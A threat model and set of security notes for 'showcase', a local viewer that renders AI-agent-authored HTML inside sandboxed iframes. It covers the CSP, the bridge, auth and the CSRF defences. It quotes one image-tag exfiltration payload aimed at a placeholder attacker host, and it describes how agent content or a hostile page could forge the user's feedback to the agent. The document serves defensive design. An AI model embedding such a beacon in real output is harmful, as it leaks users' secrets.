# showcase — threat model & security notes

The single doc on what showcase trusts, what it doesn't, and the boundaries that
keep the two apart. Read this before touching anything under "the load-bearing
invariant" below — the sandbox, the CSP, the bridge, auth, or the CSRF guard.

## What showcase is, in trust terms

A local service: a Node HTTP server (`@showcase/server`) serving a single-origin
browser viewer (`@showcase/viewer`), driven by terminal coding agents over an
MCP/HTTP API. One board, one user. It runs on `localhost` by default and can be
exposed (a token + a tunnel) for sharing.

The defining tension: **the viewer shares an origin with the authenticated API
and the comment→agent channel, yet most of what it renders is authored by an
agent — i.e. untrusted.** An agent publishes surfaces built from typed parts
(html, markdown, mermaid, diff, terminal, image, json, code, chart, trace); the
html part is literally arbitrary markup + script. If that content could run in
the trusted viewer origin, it could read the auth cookie, call the API as the
user, or forge the `author:"user"` feedback signal the agent acts on.

So the whole design is about keeping agent-authored content **off** the trusted
origin while still letting it render richly.

## The load-bearing invariant

**Agent-authored content that becomes HTML renders ONLY inside a sandboxed,
opaque-origin iframe — never as `innerHTML`/`dangerouslySetInnerHTML` in the
trusted viewer origin.** There are exactly two safe paths, and every part kind
picks one:

1. **Build a string → hand it to a sandbox iframe.** `renderHtmlPage` (served at
   `/s/:id` for html parts) and `renderSandboxedPart` (viewer-rendered rich parts:
   markdown, mermaid, diff, terminal) emit a complete document loaded into an
   iframe. String-building is not a DOM sink, so even a markdown-it / shiki /
   mermaid / DOMPurify / diff-renderer sanitizer regression only produces a string
   — it becomes live DOM inside the iframe, never in the parent.
2. **Keep it as data → render with React text nodes / attributes.** Image and
   trace parts never build markup; values land in JSX text/attribute positions
   that React escapes.

There is no third way. Adding a part kind means choosing path 1 or 2.

## Defense in depth around the iframe

### 1. The sandbox attribute

Iframes carry `sandbox="allow-scripts"` and **not** `allow-same-origin`. Scripts
run, but the frame is an **opaque origin**: `'self'` matches nothing, there is no
access to the parent's cookies/localStorage/DOM, and `document.cookie` /
`navigator.clipboard` are unavailable inside it. A script that escapes a
sanitizer is boxed into an origin that owns nothing.

### 2. The Content-Security-Policy

Every sandboxed document carries a locked-down CSP (`packages/core/surfacePage.ts`,
`buildCsp` for html parts, `buildRichCsp` for rich parts):

- `default-src 'none'` — nothing loads unless a later directive re-permits it.
- `script-src 'unsafe-inline'` / `style-src 'unsafe-inline'` — inline only. The
  CDN allowlist is gone; **no external origin appears anywhere in the policy.**
- `font-src data:` — inline fonts only.
- `img-src data: blob: <origin>` and (html parts) `media-src data: blob: <origin>`
  — **no wildcard `https:` scheme.** This is deliberate and recent: a bare
  `https:` source is an exfiltration channel even with scripts boxed and
  `connect-src` closed — `<img src="https://attacker/?b=<secret>">` leaks data in
  the request URL and pings a tracker with no `fetch` involved. Images/media may
  only be inline (`data:`/`blob:`, can't phone home) or this board's own `origin`
  (uploaded assets at `<origin>/a/:id`). The origin must be named explicitly
  because the opaque-origin sandbox makes `'self'` match nothing.
- **No `connect-src`** — it falls back to `default-src 'none'`, so `fetch`/`XHR`/
  `WebSocket`/`EventSource` are blocked outright. A contained script has no
  network at all.
- No `'self'`, no `'unsafe-eval'`, no wildcard `*` host. (Regression-tested in
  `test/surfacePage.test.ts`.)

The net effect: a script that runs inside a surface frame cannot read the parent,
cannot reach the network, and cannot embed an external resource — its only output
is pixels and `postMessage` to the parent.

### 3. The host bridge (`postMessage`)

The one channel from a sandbox frame to the trusted parent is `postMessage`
(`BRIDGE_JS` in `surfacePage.ts`; handled by `onBridgeMessage` in
`packages/viewer/src/bridge.ts`). It is the narrowest necessary surface:

- Every message must carry the `__showcase` marker and a known `type` (`resize`,
  `send-prompt`, `open-link`, `copy`, `switch-session`). Anything else is dropped.
- Host-affecting types are gated on **frame ownership** — `frameForSource` /
  `isOwnFrame` confirm the message came from an iframe the viewer actually
  embedded, not a nested or spoofed frame.
- **`send-prompt` becomes `author:"surface"`, never `author:"user"`.** A script
  inside a surface can fire it with no human involvement, so it must never
  impersonate the user to the agent — the `"user"` label is reserved for genuine
  keystrokes in the trusted composer. This keeps untrusted surface content from
  forging the feedback signal the agent treats as the human's intent.
- `open-link` opens externally; `copy` writes the clipboard (the parent has the
  API the opaque-origin frame lacks). Neither grants API access.

## The trusted-origin perimeter

### Auth

When `SHOWCASE_TOKEN` is set, every route except `/guide`/`/setup`/`/playbook`
requires it (Authorization bearer, `?key=` query, or the cookie it sets). The
local default ships **unset** — convenient on `localhost`, and the reason the
CSRF guard below exists. An embedder can supply its own `authenticate` hook to
authorize requests upstream.

### CSRF / forged-feedback guard

Because the token-less local default authorizes every request, a malicious web
page the user also has open could POST to `localhost` (a "simple" cross-origin
request needs no preflight) and forge the `author:"user"` signal, or inject/delete
surfaces. So any **state-changing** (`POST`/`PUT`/`PATCH`/`DELETE`) `/api` or
`/mcp` request whose `Origin` is cross-origin is blocked. Browsers always send
`Origin` on these; the CLI/MCP clients send none (not a browser — no CSRF
surface); the viewer is same-origin. Only the cross-origin attacker is turned
away.

### Sharing is read-only

The one-board/one-user stance means sharing is a **static export**
(`showcase export` → one self-contained `.html`), not a live link. There is no
multi-tenant write path and no GitHub round-trip. `publicRead` modes
(`session`/`full`) expose only **GET** routes for an exposed board; writes still
require the token.

### Body limits

Every request body is capped (`/api/assets` has its own stricter streaming cap).
An oversize `Content-Length` is refused before the body is read; a chunked body is
aborted at the cap. On a token-protected board the limit runs after auth, so an
unauthenticated request is rejected before its body is touched.

## Residual risks & non-goals

- **`script-src 'unsafe-inline'` is intentional** — html parts are a feature (an
  agent ships interactive HTML). The containment story is the opaque origin + the
  no-network CSP, not script suppression. Don't "fix" this by trying to forbid
  inline scripts; fix it by keeping the sandbox/CSP intact.
- **A no-token local board trusts every local process.** This is the personal-use
  model. Set `SHOWCASE_TOKEN` before exposing the board beyond `localhost`.
- **The static export inlines content as `data:` URIs** and is a dumb file — it
  carries no auth and no live channel by design. Treat a shared export as public.
- **Not in scope:** hardening against a hostile local OS user, supply-chain
  review of npm deps (the runtime deps are deliberately few — the CLI is
  zero-dep), or DoS beyond the body caps.

## Maintaining this

When a change touches the sandbox attributes, the CSP, the bridge, the auth
middleware, or the CSRF guard, run the **`security-review`** skill over the diff
before merging — these are the load-bearing boundaries and a regression here is
silent until exploited. The CSP shape is pinned by `test/surfacePage.test.ts`
(no external host, no wildcard scheme, no `connect-src`, no `'self'`/`*`/eval);
keep those assertions green, and add one when you add a directive.
